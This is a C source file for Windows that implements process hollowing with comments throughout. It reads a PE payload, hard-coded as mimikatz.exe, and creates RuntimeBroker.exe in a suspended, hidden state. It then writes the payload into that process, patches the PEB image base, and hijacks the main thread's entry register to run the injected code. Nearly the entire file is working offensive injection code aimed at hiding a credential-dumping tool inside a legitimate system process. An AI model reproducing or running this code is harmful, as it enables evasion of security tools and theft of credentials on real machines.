/*
 * Process Hollowing
 *  - Is an injection technique that injects PE payloads into the address space of a remote process.
 *  - The remote process is often suspended child process by the process hollowing implementation.
 */

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "WindowsApp.lib")
#pragma warning (disable:4996)

#define pWinError(cApiName)	printf( "[!] %s Failed With Error: %lu\n", cApiName, GetLastError())
#define DELETE_HANDLE(H)						\
		if (H && H != INVALID_HANDLE_VALUE) {	\
			CloseHandle(H);						\
			H = NULL;							\
	}


// Function: Reads a Portable Executable (PE) payload from disk.
// Parameters:
//   cFileName   -> The path to the specified PE payload file.
//   ppFileBuffer-> Pointer to a buffer that will hold the PE file contents after reading.
//   pdwFileSize -> Pointer to a variable that will store the size of the PE payload file in bytes.
BOOL ReadPeFromDisk(_In_ LPCSTR cFileName, _Out_ PBYTE* ppFileBuffer, _Out_ PDWORD pdwFileSize) {
    HANDLE	hFile				= INVALID_HANDLE_VALUE; // File handle, initialized to an invalid value.
    PBYTE	pBuffer				= NULL; // Pointer to buffer for storing file contents, initialized to NULL.
    DWORD	dwFileSize			= 0x00; // Size of the file, initialized to 0.
    DWORD   dwNumberOfBytesRead = 0x00; // Number of bytes read from the file, initialized to 0.

    // Open the specified PE payload file
    if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        pWinError("CreateFileA");
        goto _CleanUp;
    }

    // Retrieve the size of the PE payload file
    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
        pWinError("GetFileSize");
        goto _CleanUp;
    }

    // Allocate memory for reading the PE file contents
    if ((pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
        pWinError("HeapAlloc");
        goto _CleanUp;
    }

    // Read the PE file from disk
    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
        pWinError("ReadFile");
        goto _CleanUp;
    }

    // Assign buffer address to the output parameter.
    *ppFileBuffer = pBuffer;
    *pdwFileSize = dwFileSize;

    _CleanUp:
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    if (!*ppFileBuffer && pBuffer)
        HeapFree(GetProcessHeap(), 0x00, pBuffer);
    return ((*ppFileBuffer != NULL) && (*pdwFileSize != 0x00)) ? TRUE : FALSE;
}

// Function: Iterates over the sections of the injected PE image and adjusts memory permissions accordingly using VirtualProtectEx.
// Parameters:
//   hProcess         -> Handle to the target process where the PE image is injected.
//   pPeBaseAddress   -> Base address of the injected PE image in the target process.
//   pImgNtHdrs       -> Pointer to the NT header structure of the injected PE image.
//   pImgSecHdr       -> Pointer to the sections header structure of the injected PE image.
BOOL FixPEMemoryPermissions(_In_ HANDLE hProcess, _In_ ULONG_PTR pPeBaseAddress, _In_ PIMAGE_NT_HEADERS pImgNtHdrs, _In_ PIMAGE_SECTION_HEADER pImgSecHdr) {


    DWORD i = 0;
    DWORD dwProtection = 0x00;
    DWORD dwOldProtection = 0x00;

    // Loop through each section of the PE image.
    for (i; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

        // Variables to store the new and old memory protections.
        dwProtection = 0x00; // New memory protection for the section.
        dwOldProtection = 0x00; // Old memory protection, to be retrieved.

        // Skip the section if it has no data or no associated virtual address.
        if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
            continue;

        // Determine the appropriate memory protection based on section characteristics.
        // Execute/Read/Write Section:
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)){
            dwProtection |= PAGE_EXECUTE_READWRITE; // Memory is executable, readable, and writable.
            goto PROTEC;
        }
        // Execute/Read Section:
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)){
            dwProtection |= PAGE_EXECUTE_READ; // Memory is executable and readable but not writable.
            goto PROTEC;
        }

        // Execute/Write-Copy Section:
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)){
            dwProtection |= PAGE_EXECUTE_WRITECOPY; // Memory is executable and writable, changes are not propagated to the original file.
            goto PROTEC;
        }
        // Execute-Only Section:
        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE){
            dwProtection |= PAGE_EXECUTE; // Memory is executable, not writable or readable.
        }
        // Read/Write Section:
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)){
            dwProtection |= PAGE_READWRITE; // Memory is both readable and writable.
            goto PROTEC;
        }

        // Read-Only Section:
        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ){
            dwProtection |= PAGE_READONLY; // Memory is readable, not writable.
            goto PROTEC;
        }

        // Write-Only Section:
        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE){
            dwProtection |= PAGE_WRITECOPY; // Memory is writable, changes are not propagated to the original file.
            goto PROTEC;
        }




        PROTEC:
        // Apply the determined memory protection to the section.
        if (VirtualProtectEx(hProcess, (LPVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection) == 0) {
            printf("--ERROR--\n");
            printf("pImgNtHdrs->FileHeader.NumberOfSections %llx\n", pImgNtHdrs->FileHeader.NumberOfSections);
            printf("ITERATIONS:%llx\n", i);
            printf("hProcess:%llx\n", hProcess);
            printf("(LPVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress):%llx\n", (LPVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress));
            printf("pImgSecHdr[i].SizeOfRawData:%llx\n",pImgSecHdr[i].SizeOfRawData);
            printf("&dwOldProtection:%p\n", &dwOldProtection);
            printf("dwProtection:%llx\n", dwProtection);
            pWinError("VirtualProtectEx");
            return FALSE;
        }
    }

    return TRUE;
}

// Function: Reads data from a pipe by allocating memory to accommodate the available bytes.
// Parameters:
//   StdOutRead -> Handle for reading from the pipe.
VOID ReadPipe(_In_ HANDLE StdOutRead) {

    BOOL	bSTATE = TRUE; // Loop state flag.

    do {
        DWORD dwAvailableBytes = 0x00; // Variable to store the number of bytes available in the pipe.
        PBYTE pBuffer = 0x00; // Pointer to the buffer to hold the read data.

        // Retrieve the number of bytes available to be read from the pipe.
        PeekNamedPipe(StdOutRead, NULL, 0, NULL, &dwAvailableBytes, NULL);

        // Allocate memory to hold the data from the pipe.
        pBuffer = (PBYTE)LocalAlloc(LPTR, (SIZE_T)dwAvailableBytes);
        if (!pBuffer)
            break; // Break loop if memory allocation fails.

        // Read data from the pipe into the allocated buffer.
        if (!(bSTATE = ReadFile(StdOutRead, pBuffer, dwAvailableBytes, NULL, NULL))) {
            LocalFree(pBuffer); // Free allocated memory if ReadFile fails.
            break; // Break loop if ReadFile fails.
        }

        printf(pBuffer); // Print the read data.

        LocalFree(pBuffer); // Free allocated memory.

    } while (bSTATE); // Continue while TRUE.
}


// Function CreateHollow Process
// Parameters:
//  cRemoteProcessExecutable                    -> ASCII String to process executable.
//  cProcessArgs                                -> Hold command line arguments for the target process executable.
//  pProcessInfo                                -> Pointer to PPROCESS_INFORMATION structure.
//  pStdInWrite                                 -> Handle that receive the write handle of the child process.
//  pStdOutRead                                 -> Handle that receive the read handle of the child process.
BOOL CreateHollowProcess(_In_ LPCSTR cRemoteProcessExecutable, _In_ OPTIONAL LPCSTR cProcessArgs, _Out_ PPROCESS_INFORMATION pProcessInfo, _Out_ HANDLE* pStdInWrite, _Out_ HANDLE* pStdOutRead) {
    STARTUPINFO		    StartupInfo		    = { 0x00 };
    SECURITY_ATTRIBUTES	SecAttr			    = { 0x00 };
    HANDLE			    StdInRead		    = NULL,  // Handle for reading from the input pipe. This is located on the parent's end of the read pipe.
    StdInWrite		                        = NULL,  // Handle for writing to the input pipe. This is located on the child's end of the write pipe.
    StdOutRead		                        = NULL,  // Handle for reading from the output pipe. This is located on the child's end of the read pipe.
    StdOutWrite		                        = NULL;  // Handle for writing to the output pipe. This is located on the parent's end of the write pipe.
    LPSTR cRemoteProcessCmd                = NULL;  // Command line for the remote process.
    BOOL bSTATE                             = FALSE; // State flag indicating success or failure.

    // Fill the structures with zeros to ensure clean initialization.
    RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
    RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&SecAttr, sizeof(SECURITY_ATTRIBUTES));

    SecAttr.nLength                 = sizeof(PROCESS_INFORMATION);  // Size to the PROCESS_INFORMATION structure.
    SecAttr.lpSecurityDescriptor    = NULL;                         // Assigned with default security descriptor.
    SecAttr.bInheritHandle          = TRUE;                         // New process can inherit the handle.

    // Initialize Input Pipe
    if (!CreatePipe(&StdInRead, &StdInWrite, &SecAttr, 0x00)) {
        pWinError("CreatePipe[1]");
        goto _CleanUp;
    }

    // Initialize Output Pipe
    if (!CreatePipe(&StdOutRead, &StdOutWrite, &SecAttr, 0x00)) {
        pWinError("CreatePipe[2]");
        goto _CleanUp;
    }

    // Initialize I/O Pipes
    StartupInfo.cb			    = sizeof(STARTUPINFO);
    StartupInfo.dwFlags		   |= (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
    StartupInfo.wShowWindow		= SW_HIDE;
    StartupInfo.hStdInput		= StdInRead;				            // Standard input handle for the child process.
    StartupInfo.hStdOutput		= StartupInfo.hStdError = StdOutWrite; 	// Standard output handle for the child process.

    // Calculate the size of memory required to store the command line for the remote process.
    // The command line consists of the executable path (cRemoteProcessExecutable) and optional arguments (cProcessArgs).
    // The size includes the length of the executable path, the length of the arguments (if provided), and space for null terminators.
    // If no arguments are provided, the size is calculated as 0x00 (which is equivalent to 0).
    // The size is then adjusted to include space for two null terminators (sizeof(CHAR) * 2), ensuring proper string termination.
    cRemoteProcessCmd = LocalAlloc(
            LPTR, // Flags indicating the type of allocation (LPTR initializes memory to zero).
            (
                    // Length of the executable path.
                    strlen(cRemoteProcessExecutable) +

                    // Ternary conditional operator to determine the length of the arguments string, if it exists, or to indicate 0 if there are no arguments.
                    // If cProcessArgs is not NULL, evaluate the length of the string pointed to by cProcessArgs using strlen(cProcessArgs).
                    // If cProcessArgs is NULL, return 0x00, indicating that there are no arguments.
                    (cProcessArgs ? strlen(cProcessArgs) : 0x00) +

                    // Space for two null terminators to ensure proper string termination.
                    (sizeof(CHAR) * 2)
            )
    );

// Check if memory allocation was successful.
    if (!cRemoteProcessCmd) {
        // If memory allocation fails, print an error message indicating the failure.
        pWinError("LocalAlloc");

        // Cleanup and exit the function by jumping to the _CleanUp label.
        goto _CleanUp;
    }

    // Construct the command line for the remote process by formatting the executable path and command-line arguments.
    // If cProcessArgs is NULL, the command line consists only of the executable path.
    // If cProcessArgs is not NULL, the command line includes both the executable path and the provided arguments.
    sprintf(
            cRemoteProcessCmd, // Buffer to store the formatted command line.
            cProcessArgs == NULL ? "%s" : "%s %s", // Format string based on whether command-line arguments are provided.
            cRemoteProcessExecutable, // Executable path.
            cProcessArgs == NULL ? "" : cProcessArgs // Command-line arguments (if provided).
    );

    // Attempt to create the process using the formatted command line.
    if (!CreateProcessA(
            NULL,cRemoteProcessCmd,&SecAttr,NULL,TRUE,(CREATE_SUSPENDED | CREATE_NEW_CONSOLE),NULL,NULL,&StartupInfo,pProcessInfo)) {

        pWinError("CreateProcessA");
        goto _CleanUp;
    }

    printf("[*] >> Target Process Created With PID: %lu \n", pProcessInfo->dwProcessId);

    // Assign the write handle of the child process's input pipe to the pointer specified by pStdInWrite.
    *pStdInWrite = StdInWrite;

    // Assign the read handle of the child process's output pipe to the pointer specified by pStdOutRead.
    *pStdOutRead = StdOutRead;

    bSTATE = TRUE;


    _CleanUp:
    if (cRemoteProcessCmd)
        LocalFree(cRemoteProcessCmd);
    DELETE_HANDLE(StdInRead);
    DELETE_HANDLE(StdOutWrite);
    return TRUE;
}

// Function: Replaces the base address of the injected PE payload with the base address of the legitimate process image in the same address space.
// Parameters:
//   hProcess        -> Handle to the remote process.
//   uPeBaseAddr     -> Base address of the injected PE payload in the remote process's address space.
//   Rdx             -> The value of the RDX register in the main thread, which points to the Process Environment Block (PEB) structure.
BOOL ReplaceBaseAddress(_In_ HANDLE hProcess, _In_ ULONG_PTR uPeBaseAddr, _In_ ULONG_PTR Rdx) {
    ULONG_PTR uRemoteImageBaseOffset = 0x00; // Offset of the ImageBaseAddress in the Process Environment Block (PEB) structure.
    SIZE_T NumberOfBytesWritten = 0x00; // Variable to store the number of bytes written by WriteProcessMemory.

    // Calculate the offset of the ImageBaseAddress in the Process Environment Block (PEB) structure.
    // Rdx points to the PEB structure, and Rdx + offsetof(PEB, Reserved3[1]) gives the address of PEB->Reserved3[1], which is ImageBaseAddress.
    uRemoteImageBaseOffset = (ULONG_PTR)((uintptr_t)Rdx + offsetof(PEB, Reserved3[1]));

    printf("[*] >> Overwriting Image Base Address To 0x%p \n", uPeBaseAddr);

    // Write the base address of the injected PE payload to the remote process's ImageBaseAddress.
    if (!WriteProcessMemory(hProcess, (PVOID)uRemoteImageBaseOffset, &uPeBaseAddr, sizeof(PVOID), &NumberOfBytesWritten) || sizeof(PVOID) != NumberOfBytesWritten) {
        pWinError("WriteProcessMemory");
        return FALSE;
    }

    return TRUE;
}

// Function RemotePeRun execute a Portable Executable (PE) payload within a remote process using process hollowing.
// Parameters:
//   pPeBuffer                      -> Pointer to the buffer containing the PE payload to be executed.
//   cRemoteProcessExecutable       -> Path to the executable file of the remote process where the PE payload will be executed.
//   cProcessArgs                   -> Optional command line arguments for the remote process executable.
BOOL RemotePERun(_In_ PBYTE pPeBuffer, _In_ LPCSTR cRemoteProcessExecutable, _In_ OPTIONAL LPCSTR cProcessArgs) {

    // Check if the input parameters are valid
    if (!pPeBuffer || !cRemoteProcessExecutable)
        return FALSE;

    PROCESS_INFORMATION ProcessInfo = { 0x00 };             // Information about the created process
    CONTEXT Context = { .ContextFlags = CONTEXT_ALL };      // Thread context for the main thread
    HANDLE StdInWrite = NULL, StdOutRead = NULL;            // Handles for pipes for standard input and output
    PBYTE pRemoteAddress = NULL;                            // Base address of the PE payload in the remote process
    PIMAGE_NT_HEADERS pImgNtHdrs = NULL;                    // Pointer to the NT headers of the PE payload
    PIMAGE_SECTION_HEADER pImgSecHdr = NULL;                // Pointer to the section headers of the PE payload
    SIZE_T NumberOfBytesWritten = (SIZE_T)NULL;             // Number of bytes written during memory operations
    BOOL bSTATE = FALSE;                                    // State flag for success or failure

    // Create a hollow process for remote execution
    if (!CreateHollowProcess(cRemoteProcessExecutable, cProcessArgs, &ProcessInfo, &StdInWrite, &StdOutRead))
        goto _CleanUp;

    // Check if the process and thread handles are created successfully
    if (!ProcessInfo.hProcess || !ProcessInfo.hThread)
        goto _CleanUp;

    // Retrieve the NT headers of the PE payload
    pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)pPeBuffer + ((PIMAGE_DOS_HEADER)pPeBuffer)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        printf("Invalid NT Image Headers\n");
        goto _CleanUp;
    }


    // Allocate memory in the remote process for the PE payload
    if (!(pRemoteAddress = VirtualAllocEx(ProcessInfo.hProcess, (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase, (SIZE_T)pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {

        pWinError("VirtualAllocEx");
        goto _CleanUp;
    }

    // Print remote and preferred base addresses
    printf("[*] >> Remote Image Base Address: 0x%p\n", pRemoteAddress);
    printf("[*] >> Preferable Base Address: 0x%p\n", (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase);

    printf("[+] >> Press <Enter> To Write The PE Payload ...");
    getchar();

    // Copy headers of the PE payload to the remote process
    if (!WriteProcessMemory(ProcessInfo.hProcess, pRemoteAddress, pPeBuffer, pImgNtHdrs->OptionalHeader.SizeOfHeaders, &NumberOfBytesWritten) || pImgNtHdrs->OptionalHeader.SizeOfHeaders != NumberOfBytesWritten) {
        pWinError("WriteProcessMemory");
        goto _CleanUp;
    }

    printf("[*] >> Wrote Headers At %p Of Size %d \n", (void*)pRemoteAddress, (int)pImgNtHdrs->OptionalHeader.SizeOfHeaders);
    printf("[*] >> Writing Sections ... \n");

    // Copy sections of the PE payload to the remote process
    pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
    for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

        printf("[*] >>  \t<i> Writing Section %s At 0x%p Of Size %d \n", pImgSecHdr[i].Name, (void*)(pRemoteAddress + pImgSecHdr[i].VirtualAddress), (int)pImgSecHdr[i].SizeOfRawData);

        if (!WriteProcessMemory(ProcessInfo.hProcess, (PVOID)(pRemoteAddress + pImgSecHdr[i].VirtualAddress), (PVOID)(pPeBuffer + pImgSecHdr[i].PointerToRawData), pImgSecHdr[i].SizeOfRawData, &NumberOfBytesWritten) || pImgSecHdr[i].SizeOfRawData != NumberOfBytesWritten) {
            pWinError("WriteProcessMemory");
            goto _CleanUp;
        }
    }

    // Get thread context of the main thread
    if (!GetThreadContext(ProcessInfo.hThread, &Context)) {
        pWinError("GetThreadContext");
        goto _CleanUp;
    }

    // Patch the 'ImageBaseAddress' element in the 'PEB' structure of the remote process to point to our PE instead
    if (!ReplaceBaseAddress(ProcessInfo.hProcess, (ULONG_PTR)pRemoteAddress, Context.Rdx)) {
        goto _CleanUp;
    }

    // Set suitable memory permissions
    if (!FixPEMemoryPermissions(ProcessInfo.hProcess, (ULONG_PTR)pRemoteAddress, pImgNtHdrs, pImgSecHdr))
        goto _CleanUp;

    printf("[*] >> Press <Enter> To Execute The Entry Payload \n");
    getchar();
    printf("[*] >> Hijacking Thread To Run EntryPoint: 0x%p\n", (LPVOID)(pRemoteAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint));

    // Thread Hijacking:
    Context.Rcx = (DWORD64)(pRemoteAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
    if (!SetThreadContext(ProcessInfo.hThread, &Context)) {
        pWinError("SetThreadContext");
        goto _CleanUp;
    }

    printf("[+] >> Press <Enter> To Resume The Process\n");
    getchar();

    // Resume thread
    if (ResumeThread(ProcessInfo.hThread) == ((DWORD)-1)) {
        pWinError("ResumeThread");
        goto _CleanUp;
    }

    // Wait till the process runs the code
    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

    // Read output
    printf("[*] >> Reading output: \n\n");
    ReadPipe(StdOutRead);

    bSTATE = TRUE;

    _CleanUp:
    DELETE_HANDLE(StdInWrite);
    DELETE_HANDLE(StdOutRead);
    DELETE_HANDLE(ProcessInfo.hProcess);
    DELETE_HANDLE(ProcessInfo.hThread);
    return bSTATE;

}

#define PE_PAYLOAD			"C:\\Users\\D3v\\Downloads\\mimikatz.exe"
#define TARGET_PROCESS		"C:\\Windows\\System32\\RuntimeBroker.exe"
#define PARMS				"coffee exit"

int main() {
    PBYTE pBuffer = NULL;
    DWORD dwBuffer = 0x00;

    if (!ReadPeFromDisk(PE_PAYLOAD, &pBuffer, &dwBuffer)) {
        return 1;
    }
    return RemotePERun(pBuffer, TARGET_PROCESS, PARMS) ? 0 : -1;
}